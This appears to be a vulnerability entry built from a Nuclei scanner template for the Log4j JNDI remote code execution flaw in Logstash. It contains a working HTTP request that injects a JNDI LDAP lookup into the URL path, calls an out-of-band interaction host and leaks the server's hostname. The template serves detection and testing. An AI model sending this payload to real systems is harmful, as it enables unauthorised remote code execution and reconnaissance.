# Vulnerability: Logstash - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`logstash-log4j-rce.yaml`)

## Description
Logstash is susceptible to Log4j JNDI remote code execution. Logstash is a free and open server-side data processing pipeline that ingests data from a multitude of sources, transforms it, and then sends it to your favorite "stash."

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/logstash/pipeline/${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
Host: {{Hostname}}
Referrer: {{RootURL}}/app/management/ingest/pipelines/
Content-Type: application/json
```

